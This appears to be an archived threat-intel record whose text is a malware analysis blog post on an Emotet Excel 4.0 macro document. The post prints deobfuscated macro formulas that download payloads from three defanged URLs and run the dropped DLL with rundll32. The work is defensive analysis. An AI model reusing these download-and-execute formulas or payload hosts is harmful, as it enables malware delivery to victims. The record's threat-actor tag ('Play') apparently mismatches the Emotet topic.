@@ -1,0 +1,63 @@
+{
+    "id": "90061ecf-1e07-4942-af35-757c188224a4",
+    "created_at": "2023-01-12T15:01:53.342914Z",
+    "updated_at": "2025-03-27T02:16:25.716157Z",
+    "deleted_at": null,
+    "sha1_hash": "2b29734d331cc5ff7b2aceeb5d90a1b9da0f19af",
+    "title": "2022-01-17 - Emotet's Excel 4.0 Macros Dropping DLLs",
+    "authors": "",
+    "file_creation_date": "2022-05-28T05:06:56Z",
+    "file_modification_date": "2022-05-28T05:06:56Z",
+    "file_size": 91643,
+    "plain_text": "# Emotet's Excel 4.0 Macros Dropping DLLs\n\n**forensicitguy.github.io/emotet-excel4-macro-analysis/**\n\n### By Tony Lambert Posted 2022-01-17 Updated 2022-03-28 4 min read\n\n\nJanuary 17, 2022\n\n\n### It’s been a little while since I checked in on Emotet to see how its first stage loaders are doing. Lately the first stage has been using Excel 4.0 macros to drop payloads, so in this post I’ll walk through the analysis of one Emotet Excel document. If you want to play along at home, I’m working with this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/1a243db583013a6999761dad88d6952351fdc2cd17d2016990276a9dd11ac90b/\n\n## Triaging the File\n\n### As always, we should confirm our filetype first. Let’s give it a go using file, xxd, and head .\n```\n  remnux@remnux:~/cases/emotet$ file nn30.xlsm \n  nn30.xlsm: Microsoft Excel 2007+\n  remnux@remnux:~/cases/emotet$ xxd nn30.xlsm | head\n  00000000: 504b 0304 1400 0600 0800 0000 2100 a78b \n  PK..........!...\n  00000010: 2b33 c901 0000 9707 0000 1300 0802 5b43 \n  +3............[C\n  00000020: 6f6e 7465 6e74 5f54 7970 6573 5d2e 786d \n  ontent_Types].xm\n  00000030: 6c20 a204 0228 a000 0200 0000 0000 0000 l ...\n  (..........\n  00000040: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000050: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000060: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000070: 0000 0000 0000 0101 0000 0000 0000 0000 \n  ................\n  00000080: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n  00000090: 0000 0000 0000 0000 0000 0000 0000 0000 \n  ................\n\n The file output says the file magic belongs to a Excel document, and the first few bytes are what I’d expect from an Excel document. The\n PK part of the magic is common to zip archives as well and Excel XLSX documents are similar to zip archives. The string [Content\nTypes].xml refers to the filename of one of the XML files that make up a larger Excel document. If you unzip a XLSX file, you’ll find one of\n\n those files in the extracted content. All told, this is consistent with an Excel doc.\n\n## Analyzing the Document\n\n### A good starting point for the analysis is olevba .\n  remnux@remnux:~/cases/emotet$ olevba nn30.xlsm \n  olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools\n  ===============================================================================\n  FILE: nn30.xlsm\n  Type: OpenXML\n  ------------------------------------------------------------------------------  VBA MACRO xlm_macro.txt \n  in file: xlm_macro - OLE stream: 'xlm_macro'\n  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n  ' RAW EXCEL4/XLM MACRO FORMULAS:\n  ' SHEET: EWDFFEFAD, Macrosheet\n\n```\n\n-----\n\n```\nE32), 0\n' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n' EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:\n' CELL:E13   , FullEvaluation  , False\n' CELL:E18   , FullEvaluation  , CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"hxxps://zml.laneso.com/packet/AlvJ8OdtSYEee\n' CELL:E20   , FullEvaluation  , IF(YHYH<0,CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"hxxp://ostadsarma.com/wp-admin/JN\n' CELL:E22   , FullEvaluation  , IF(YHYH1<0,CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"hxxp://govtjobresultbd.xyz/sjjz/\n' CELL:E24   , FullEvaluation  , IF(YHYH2<0,CLOSE(0),)\n' CELL:E26   , PartialEvaluation , =EXEC(\"C:\\Windows\\SysWow64\\rundll32.exe ..\\erum.ocx,D\"\"&\"\"l\"\"&\"\"lR\"\"&\"\"egister\"\"&\"\"Serve\"\"\n' CELL:E32   , FullEvaluation  , RETURN()\n+----------+--------------------+---------------------------------------------+\n|Type   |Keyword       |Description                 |\n+----------+--------------------+---------------------------------------------+\n|Suspicious|CALL        |May call a DLL using Excel 4 Macros (XLM/XLF)|\n|Suspicious|Windows       |May enumerate application windows (if    |\n|     |          |combined with Shell.Application object)   |\n|Suspicious|URLDownloadToFileA |May download files from the Internet     |\n|Suspicious|EXEC        |May run an executable file or a system    |\n|     |          |command using Excel 4 Macros (XLM/XLF)    |\n|Suspicious|Base64 Strings   |Base64-encoded strings were detected, may be |\n|     |          |used to obfuscate strings (option --decode to|\n|     |          |see all)                   |\n|IOC    |hxxps://zml.laneso.c|URL                     |\n|     |om/packet/AlvJ8OdtSY|                       |\n|     |EeeCQP/       |                       |\n|IOC    |hxxp://ostadsarma.co|URL                     |\n|     |m/wp-admin/JNgASjNC/|                       |\n|IOC    |hxxp://govtjobresult|URL                     |\n|     |bd.xyz/sjjz/UIUhOHsL|                       |\n|     |qjOy9/       |                       |\n|IOC    |rundll32.exe    |Executable file name             |\n|Suspicious|XLM macro      |XLM macro found. It may contain malicious  |\n|     |          |code                     |\n+----------+--------------------+---------------------------------------------+\n\n```\n\n-----\n\n### Interpreting the output, it looks like the document has Excel 4.0 macros that download content from these URLs:\n```\n   hxxps://zml.laneso[.]com/packet/AlvJ8OdtSYEeeCQP/\n   hxxp://ostadsarma[.]com/wp-admin/JNgASjNC/\n   hxxp://govtjobresultbd[.]xyz/sjjz/UIUhOHsLqjOy9/\n\n And using the URLDownloadToFileA function from urlmon.dll, the document saved the downloaded content to erum.ocx .\n\n Afterward, the document proceeded to execute C:\\Windows\\SysWow64\\rundll32.exe\n..\\erum.ocx,D\"&\"l\"&\"lR\"&\"egister\"&\"Serve\"&\"r . The obfuscation on the DLL export reduces down to DllRegisterServer . So the\n\n process ancestry becomes excel.exe -> rundll32.exe erum.ocx,DllRegisterServer .\n\n We can confirm this by looking at a sandbox report from Tria.ge here: https://tria.ge/220115-mqldpsdhb7/behavioral1.\n\n Thanks for reading!\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-17 - Emotet's Excel 4.0 Macros Dropping DLLs.pdf"
+    ],
+    "report_names": [
+        "2022-01-17 - Emotet's Excel 4.0 Macros Dropping DLLs.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535713,
+    "ts_updated_at": 1743041785,
+    "ts_creation_date": 1653714416,
+    "ts_modification_date": 1653714416,
+    "files": {
+        "pdf": "https://archive.orkl.eu/2b29734d331cc5ff7b2aceeb5d90a1b9da0f19af.pdf",
+        "text": "https://archive.orkl.eu/2b29734d331cc5ff7b2aceeb5d90a1b9da0f19af.txt",
+        "img": "https://archive.orkl.eu/2b29734d331cc5ff7b2aceeb5d90a1b9da0f19af.jpg"
+    }
+}
